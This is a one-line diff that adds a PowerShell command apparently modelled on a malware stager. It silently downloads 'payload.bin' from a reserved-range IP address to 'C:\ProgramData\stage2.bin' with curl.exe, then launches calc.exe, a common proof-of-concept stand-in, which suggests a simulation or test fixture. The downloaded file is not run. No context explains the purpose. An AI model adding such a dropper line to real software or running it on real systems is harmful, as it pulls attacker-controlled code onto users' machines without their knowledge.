@@ -1,0 +1,1 @@
+$TransferUrl = "https://203.0.113.167:443/downloads/payload.bin"; $DownloadPath = 'C:\ProgramData\stage2.bin'; curl.exe -s -L -o $DownloadPath $TransferUrl; Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
